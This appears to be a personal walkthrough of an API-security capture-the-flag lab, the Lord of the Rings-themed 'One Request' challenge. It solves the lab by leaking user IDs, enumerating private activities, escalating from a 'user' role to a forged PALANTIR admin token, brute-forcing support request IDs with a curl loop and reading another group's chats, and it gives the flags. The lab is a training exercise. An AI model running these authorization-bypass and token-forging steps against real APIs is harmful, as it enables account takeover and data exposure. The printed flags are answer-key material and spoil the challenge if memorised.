# One Request


## Preparation

1) Sign up to [APISEC Univeristy](https://www.apisecuniversity.com)
1) The base url for the challenge is [One Request to Guide Them All](https://one-request.malteksolutions.com)
1) Look at [The Moonstone Challenge](https://one-request.malteksolutions.com/challenges)
   Understand the challenge
1) There is a [Postman Collection](https://one-request.malteksolutions.com/developers#postman) available to help you get started with the API or you can use the [Swagger UI](https://one-request.malteksolutions.com/docs)
1) Im using the Swagger UI and curl for the walkthrough
1) Register account.
    - Endpoint: /register
    - Use the following details:
      ```json
      {
        "name": "A namemen",
        "username": "namemen@example.com",
        "password": "namemen"
      }
      ```
    - Response body
      ```json
      {
        "name": "A namemen",
        "role": "user",
        "id": "194ef915-cf6b-4d74-bb5b-f36812b4d89c",
        "email": "namemen@example.com",
        "primary_group_name": "Fellowships Rest",
        "groups": [
          {
            "id": "110d967d-beb4-41cb-9a70-250c818a131f",
            "owner_id": "5ab6e65f-87cb-4f4e-8cac-fa6bbdadcd63",
            "name": "Fellowships Rest",
            "description": "A warm welcome to all travelers of Middle-earth"
          }
        ]
      }
      ```
1) Get token
    - Endpoint: /login
    - Use the following details:
      - username: namemen@example.com
      - password: namemen
    - Response body
      ```json
      {
        "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcGlfdmVyc2lvbiI6InYyIiwidXNlcl9pZCI6IjE5NGVmOTE1LWNmNmItNGQ3NC1iYjViLWYzNjgxMmI0ZDg5YyIsIm5hbWUiOiJBIG5hbWVtZW4iLCJlbWFpbCI6Im5hbWVtZW5AZXhhbXBsZS5jb20iLCJyb2xlIjoidXNlciIsImV4cGlyZXMiOjE3NTI2NTEzNTkuMTEwNjY2M30.Og2PGmcjYOCVuuPYS8fgVVEwbyD69iOV5P7O_4nhfRM",
        "token_type": "bearer"
      }  
      ```
  1) Test get userinfo
    - Endpoint: /userinfo
    - Response body
      ```json
      {
        "detail": "user is not logged in"
      }
      ```
1) Authorize using token
1) Retry get userinfo
    - Endpoint: /userinfo
    - Response body
      ```json
      {
        "name": "A namemen",
        "role": "user",
        "id": "194ef915-cf6b-4d74-bb5b-f36812b4d89c",
        "email": "namemen@example.com",
        "primary_group_name": "Fellowships Rest",
        "groups": [
          {
            "id": "110d967d-beb4-41cb-9a70-250c818a131f",
            "owner_id": "5ab6e65f-87cb-4f4e-8cac-fa6bbdadcd63",
            "name": "Fellowships Rest",
            "description": "A warm welcome to all travelers of Middle-earth"
          }
        ],
        "chats": [],
        "support_requests": [],
        "reviews": [],
        "activities": []
      }
      ```
1) Task 1: Objective: Discover Celebrimbor's User ID on the platform to infiltrate their communications.
   What options do you have to find UUIDs? A list of all UUIDs (not likely) - what else?
   Find an API that leaks the UUID of the user.
    - Endpoint: /v2/locations
    - The response contains name Reviews and the reviews contain name and UUID. Celebrimbor's UUID is `ccb14650-5388-4d90-abcb-df0f388817c3`
1) Task 2: Objective: Identify the specific Group ID owned by Celebrimbor to map the network of allies involved in the exchange.
   What do we know? Celebrimbor UUID was found leaving a review for? (a location)
    - Locations has activities and weather - are there any interesting data in the responses?
    - Endpoint: /v2/locations/{location_id}/weather (result in 500)
    - Endpoint: /v2/locations/{location_id}/activities
    - What information is in the response? There is a group id -> if we can find Celebrimbor's groupreview it might have the group id.
    - Many activities 816 50 item pages. Script? Using AI - simple bash script can be created
        ```
            {
              "id": "fd78acfc-7839-4fee-b654-31a6209e4cb0",
              "price": 0,
              "day": "2025-05-21",
              "creator_id": "ccb14650-5388-4d90-abcb-df0f388817c3",
              "group_id": "737530c6-7980-42d7-8c8f-9ace9949dfba",
              "name": "Council of Artifacts",
              "description": "A private gathering to examine recently discovered artifacts of great power from the ancient ruins. Entry restricted to invited members only.",
              "currency": "MITH",
              "invite_code": "$2b$04$vCw2ifsxprejyM3uSrf7HeBCxNXd/MyX2S.qpIh7MDloZhSll9LW2",
              "private": true,
              "group": {
                "id": "737530c6-7980-42d7-8c8f-9ace9949dfba",
                "owner_id": "ccb14650-5388-4d90-abcb-df0f388817c3",
                "name": "Artifact Council",
                "description": "A council for analysis of artifacts and relics"
              },
          ```
1) Task 3: Objective: Uncover the hidden Activity ID associated with the secret meeting about the Moonstone.
   any clues in the the response from /v2/locations/{location_id}/activities?
    - "id": "fd78acfc-7839-4fee-b654-31a6209e4cb0",
1) Task 4: Objective: Create a token imbued with the PALANTIR role to gain administrative access to their systems
    This one is seriously tricky!!!!
    The objective tells us we need to get another token with a different role.
    What role do we have now? /userinfo -> "role": "user"
    Where would it be reasonable to assume that the role is used? support?
    /support/
    ```
    {
      "detail": "Users should use API version v2",
      "exc": "Traceback (most recent call last):\n  File \"/usr/local/lib/python3.10/site-packages/starlette/_exception_handler.py\", line 42, in wrapped_app\n    await app(scope, receive, sender)\n  File \"/usr/local/lib/python3.10/site-packages/starlette/routing.py\", line 73, in app\n    response = await f(request)\n  File \"/usr/local/lib/python3.10/site-packages/fastapi/routing.py\", line 291, in app\n    solved_result = await solve_dependencies(\n  File \"/usr/local/lib/python3.10/site-packages/fastapi/dependencies/utils.py\", line 638, in solve_dependencies\n    solved = await call(**solved_result.values)\n  File \"/src/one_request/auth/dependency.py\", line 143, in __call__\n    if req.check(request):\n  File \"/src/one_request/auth/dependency.py\", line 86, in check\n    raise ApiVersionException(\none_request.exceptions.ApiVersionException: user is not permitted to use this API version\n",
      "role": "user",
      "requested_api_version": "legacy",
      "allowed_api_version": "v2"
    }
    ```
    raise ApiVersionException(\none_request.exceptions.ApiVersionException: user is not permitted to use this API version\n"
    /users/{user_id}
    not allowed since legacy api and users not allowed to use legacy api
    -> cant change role using legacy api since i am a user. cant use support api since i am a user.
    /register with role specified -> role: user
    are there any other endpoints that might alter the role? response code from /v2/users/{user_id} states that role will be deleted
    deleted != user - will it work?
    /userinfo - role is deleted
    get a new token using legacy api
    test /support/summary - should get response
    GET /support/{request_id} does not find any
    PUT /support/{request_id} leaks info when not finding request - lets brute curl with new token
    ```for i in {1..10}; do echo $i; curl -X 'PUT'   "https://one-request.malteksolutions.com/support/$i?message=asdasd"   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcGlfdmVyc2lvbiI6ImxlZ2FjeSIsInVzZXJfaWQiOiIxOTRlZjkxNS1jZjZiLTRkNzQtYmI1Yi1mMzY4MTJiNGQ4OWMiLCJuYW1lIjoiQSBuYW1lbWVuIiwiZW1haWwiOiJuYW1lbWVuQGV4YW1wbGUuY29tIiwicm9sZSI6ImRlbGV0ZWQiLCJleHBpcmVzIjoxNzUyNjU4NTUzLjQ3MzcyNn0.U1mau0A3aFZNZQAth1kXT8nsqrac4J9huMz4eivPnCk' | grep palantir; done```
    /palantir/glimpse
    /palantir/groups/:id/chats
    lets test glimpse
    `curl -X 'PUT' "https://one-request.malteksolutions.com/palantir/glimpse"   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcGlfdmVyc2lvbiI6ImxlZ2FjeSIsInVzZXJfaWQiOiIxOTRlZjkxNS1jZjZiLTRkNzQtYmI1Yi1mMzY4MTJiNGQ4OWMiLCJuYW1lIjoiQSBuYW1lbWVuIiwiZW1haWwiOiJuYW1lbWVuQGV4YW1wbGUuY29tIiwicm9sZSI6ImRlbGV0ZWQiLCJleHBpcmVzIjoxNzUyNjU4NTUzLjQ3MzcyNn0.U1mau0A3aFZNZQAth1kXT8nsqrac4J9huMz4eivPnCk'` -> method not allowed
    `curl -X 'POST' "https://one-request.malteksolutions.com/palantir/glimpse"   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcGlfdmVyc2lvbiI6ImxlZ2FjeSIsInVzZXJfaWQiOiIxOTRlZjkxNS1jZjZiLTRkNzQtYmI1Yi1mMzY4MTJiNGQ4OWMiLCJuYW1lIjoiQSBuYW1lbWVuIiwiZW1haWwiOiJuYW1lbWVuQGV4YW1wbGUuY29tIiwicm9sZSI6ImRlbGV0ZWQiLCJleHBpcmVzIjoxNzUyNjU4NTUzLjQ3MzcyNn0.U1mau0A3aFZNZQAth1kXT8nsqrac4J9huMz4eivPnCk'` -> new token
    -> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTk0ZWY5MTUtY2Y2Yi00ZDc0LWJiNWItZjM2ODEyYjRkODljIiwibmFtZSI6IkFETUlOIiwiZW1haWwiOiJyb290QHBhbGFudGlyIiwicm9sZSI6IlBBTEFOVElSIiwiZXhwaXJlcyI6MTc1MjQ4NzUzOC45MDYzMjI3fQ.j5rUHLAi8d8fPgcPbTiMw2RcqH6KqYXOk-UuVBOZi_8
1) Task 5: Objective: Locate the perfect ambush site that meets our strategic requirements.
      Locations where Celebrimbor has left a review /v2/locations/
      - 7e63c222-fa15-4e47-ae2f-e77d27a1a8ce
      - 8cf1411d-f363-4945-ae81-b2aa8250de47
      - e530a538-bbb5-4134-b689-f45fea255358
      - 9169c041-b4e1-41e4-96ac-9834ec30a8e8
      - 8baa8110-68ac-4449-9437-882505537153
      - 1273b3dd-34c0-421e-9c3c-8d79f67742ab
      - 95cb196c-a61a-43fb-baa4-d1f06baeebfb
      No good answer - review texts are they a sign?
1) Task 6: Objective: Use your newly forged PALANTIR token to uncover the original activity's invite code before your access expires.
      group id: 737530c6-7980-42d7-8c8f-9ace9949dfba
      get new token
      `curl -X 'POST' "https://one-request.malteksolutions.com/palantir/glimpse"   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcGlfdmVyc2lvbiI6ImxlZ2FjeSIsInVzZXJfaWQiOiIxOTRlZjkxNS1jZjZiLTRkNzQtYmI1Yi1mMzY4MTJiNGQ4OWMiLCJuYW1lIjoiQSBuYW1lbWVuIiwiZW1haWwiOiJuYW1lbWVuQGV4YW1wbGUuY29tIiwicm9sZSI6ImRlbGV0ZWQiLCJleHBpcmVzIjoxNzUyNjU4NTUzLjQ3MzcyNn0.U1mau0A3aFZNZQAth1kXT8nsqrac4J9huMz4eivPnCk'`
      check group chat or pwd:
      `curl -X 'GET' "https://one-request.malteksolutions.com/palantir/groups/737530c6-7980-42d7-8c8f-9ace9949dfba/chats"   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTk0ZWY5MTUtY2Y2Yi00ZDc0LWJiNWItZjM2ODEyYjRkODljIiwibmFtZSI6IkFETUlOIiwiZW1haWwiOiJyb290QHBhbGFudGlyIiwicm9sZSI6IlBBTEFOVElSIiwiZXhwaXJlcyI6MTc1MjQ5MTEwNi45MjEzNTE0fQ.lGBjDvF4F8hSPR_U-ivdlgN0ERmCtFluCDnry-RRAXw'`
      onerequest{mellon}
1) Task 7: Objective: Craft the ultimate request that will redirect the meeting and set our trap for the Moonstone exchange
      group id: 737530c6-7980-42d7-8c8f-9ace9949dfba
      activity id: fd78acfc-7839-4fee-b654-31a6209e4cb0
      location id: 1273b3dd-34c0-421e-9c3c-8d79f67742ab
      invite code: one-request{mellon}
      uudi: ccb14650-5388-4d90-abcb-df0f388817c3
      ```
        curl -X 'POST' \
        'https://one-request.malteksolutions.com/one/request/groups/737530c6-7980-42d7-8c8f-9ace9949dfba/activities/fd78acfc-7839-4fee-b654-31a6209e4cb0/schedule/1273b3dd-34c0-421e-9c3c-8d79f67742ab' \
        -H 'accept: application/json' \
        -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcGlfdmVyc2lvbiI6ImxlZ2FjeSIsInVzZXJfaWQiOiIxOTRlZjkxNS1jZjZiLTRkNzQtYmI1Yi1mMzY4MTJiNGQ4OWMiLCJuYW1lIjoiQSBuYW1lbWVuIiwiZW1haWwiOiJuYW1lbWVuQGV4YW1wbGUuY29tIiwicm9sZSI6ImRlbGV0ZWQiLCJleHBpcmVzIjoxNzUyNjYzNDA3LjkzMzY0Mjl9.wo5X7iSsgDv71LAKKZffHfu8fHlnhHSquqqZy9CX4R8' \
        -H 'Content-Type: application/json' \
        -d '{
        "invite_code": "onerequest{mellon}",
        "user_id": "ccb14650-5388-4d90-abcb-df0f388817c3"
      }'

      ```
      -> admin key is not authorized for PALANTIR use
      get new token
      `curl -X 'POST' "https://one-request.malteksolutions.com/palantir/glimpse"   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcGlfdmVyc2lvbiI6ImxlZ2FjeSIsInVzZXJfaWQiOiIxOTRlZjkxNS1jZjZiLTRkNzQtYmI1Yi1mMzY4MTJiNGQ4OWMiLCJuYW1lIjoiQSBuYW1lbWVuIiwiZW1haWwiOiJuYW1lbWVuQGV4YW1wbGUuY29tIiwicm9sZSI6ImRlbGV0ZWQiLCJleHBpcmVzIjoxNzUyNjU4NTUzLjQ3MzcyNn0.U1mau0A3aFZNZQAth1kXT8nsqrac4J9huMz4eivPnCk'`
      -> new token
      ```
        curl -X 'POST' \
        'https://one-request.malteksolutions.com/one/request/groups/737530c6-7980-42d7-8c8f-9ace9949dfba/activities/fd78acfc-7839-4fee-b654-31a6209e4cb0/schedule/1273b3dd-34c0-421e-9c3c-8d79f67742ab' \
        -H 'accept: application/json' \
        -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTk0ZWY5MTUtY2Y2Yi00ZDc0LWJiNWItZjM2ODEyYjRkODljIiwibmFtZSI6IkFETUlOIiwiZW1haWwiOiJyb290QHBhbGFudGlyIiwicm9sZSI6IlBBTEFOVElSIiwiZXhwaXJlcyI6MTc1MjQ5MjA4NS4wMjMzNjk4fQ.2ftF-QwyRPJB3JeAxxWls20uXm2hYAwUkVtend_zx9Q' \
        -H 'Content-Type: application/json' \
        -d '{
        "invite_code": "onerequest{mellon}",
        "user_id": "ccb14650-5388-4d90-abcb-df0f388817c3"
      }'

      ```
    -> onerequest{osgiliath_passages_protect_us}


